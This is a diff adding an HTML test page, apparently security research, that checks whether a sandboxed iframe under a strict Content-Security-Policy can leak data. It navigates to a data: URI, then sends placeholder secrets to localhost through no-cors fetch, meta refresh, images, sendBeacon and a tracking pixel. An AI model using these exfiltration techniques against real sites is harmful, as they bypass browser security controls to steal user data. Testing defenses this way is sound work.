@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head><title>Round 7: Data Exfiltration via no-cors fetch from data: URI</title></head>
+<body>
+<h1>Round 7: Can data be exfiltrated via URL in no-cors fetch?</h1>
+<p>Even if the response is opaque, if the request reaches the server, data can be
+exfiltrated via query parameters in the URL.</p>
+<div id="results"></div>
+
+<h2>Test 51: CSP meta tag -> data: URI -> no-cors fetch with secret in URL</h2>
+<iframe id="test51" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';&quot;>
+  <script>
+    location.href = 'data:text/html,<script>fetch(&quot;http://localhost:8000/exfil-test-51?secret=LEAKED_DATA&quot;,{mode:&quot;no-cors&quot;}).then(function(r){parent.postMessage({test:51,result:&quot;no-cors fetch sent, type: &quot;+r.type},&quot;*&quot;)}).catch(function(e){parent.postMessage({test:51,result:&quot;no-cors fetch blocked: &quot;+e.message},&quot;*&quot;)})<\/script>';
+  </script>
+"></iframe>
+
+<h2>Test 52: CSP meta tag -> meta refresh to data: URI -> no-cors fetch with secret</h2>
+<iframe id="test52" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';&quot;>
+  <script>
+    const meta = document.createElement('meta');
+    meta.httpEquiv = 'refresh';
+    meta.content = '0;url=data:text/html,<script>fetch(&quot;http://localhost:8000/exfil-test-52?secret=LEAKED_VIA_REFRESH&quot;,{mode:&quot;no-cors&quot;}).then(function(r){parent.postMessage({test:52,result:&quot;no-cors via refresh, type: &quot;+r.type},&quot;*&quot;)}).catch(function(e){parent.postMessage({test:52,result:&quot;blocked: &quot;+e.message},&quot;*&quot;)})<\/script>';
+    document.head.appendChild(meta);
+    setTimeout(() => parent.postMessage({test: 52, result: 'timeout'}, '*'), 4000);
+  </script>
+"></iframe>
+
+<h2>Test 53: CSP meta tag -> data: URI -> Image with secret in URL</h2>
+<iframe id="test53" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';&quot;>
+  <script>
+    location.href = 'data:text/html,<script>var img=new Image();img.src=&quot;http://localhost:8000/exfil-test-53?secret=LEAKED_VIA_IMG&quot;;img.onload=function(){parent.postMessage({test:53,result:&quot;img loaded&quot;},&quot;*&quot;)};img.onerror=function(){parent.postMessage({test:53,result:&quot;img onerror but check server logs&quot;},&quot;*&quot;)};setTimeout(function(){parent.postMessage({test:53,result:&quot;img timeout - check server logs&quot;},&quot;*&quot;)},3000)<\/script>';
+  </script>
+"></iframe>
+
+<h2>Test 54: CSP meta tag -> data: URI -> sendBeacon with secret</h2>
+<iframe id="test54" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';&quot;>
+  <script>
+    location.href = 'data:text/html,<script>var result=navigator.sendBeacon(&quot;http://localhost:8000/exfil-test-54?secret=LEAKED_VIA_BEACON&quot;,&quot;body-data&quot;);parent.postMessage({test:54,result:&quot;sendBeacon returned: &quot;+result},&quot;*&quot;)<\/script>';
+  </script>
+"></iframe>
+
+<h2>Test 55: CSP meta tag -> data: URI -> new Image() tracking pixel</h2>
+<iframe id="test55" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';&quot;>
+  <script>
+    location.href = 'data:text/html,<script>new Image().src=&quot;http://localhost:8000/exfil-test-55?pixel=TRACKING&quot;;parent.postMessage({test:55,result:&quot;pixel fired - check server logs&quot;},&quot;*&quot;)<\/script>';
+  </script>
+"></iframe>
+
+<h2>Test 56: No CSP at all, just sandbox -> data: URI -> no-cors fetch (isolate sandbox effect)</h2>
+<iframe id="test56" sandbox="allow-scripts" srcdoc="
+  <script>
+    location.href = 'data:text/html,<script>fetch(&quot;http://localhost:8000/exfil-test-56?secret=NO_CSP_SANDBOX_ONLY&quot;,{mode:&quot;no-cors&quot;}).then(function(r){parent.postMessage({test:56,result:&quot;no-cors from sandbox-only data URI, type: &quot;+r.type},&quot;*&quot;)}).catch(function(e){parent.postMessage({test:56,result:&quot;blocked: &quot;+e.message},&quot;*&quot;)})<\/script>';
+  </script>
+"></iframe>
+
+<script>
+  const results = {};
+  const testIds = [51,52,53,54,55,56];
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.test) {
+      results[e.data.test] = e.data.result;
+      const div = document.getElementById('results');
+      div.innerHTML = '<h2>Results So Far</h2><pre>' +
+        Object.entries(results)
+          .sort(([a],[b]) => a-b)
+          .map(([k,v]) => 'Test ' + k + ': ' + v)
+          .join('\n') +
+        '</pre>';
+      if (Object.keys(results).length >= testIds.length) {
+        window.__allDone = true;
+        div.innerHTML += '<p><strong>ALL TESTS COMPLETE</strong></p>';
+      }
+    }
+  });
+
+  setTimeout(() => {
+    for (const i of testIds) {
+      if (!results[i]) results[i] = 'TIMEOUT - no response received';
+    }
+    const div = document.getElementById('results');
+    div.innerHTML = '<h2>Final Results</h2><pre>' +
+      Object.entries(results)
+        .sort(([a],[b]) => a-b)
+        .map(([k,v]) => 'Test ' + k + ': ' + v)
+        .join('\n') +
+      '</pre><p><strong>ALL TESTS COMPLETE</strong></p>';
+    window.__allDone = true;
+  }, 10000);
+</script>
+</body>
+</html>
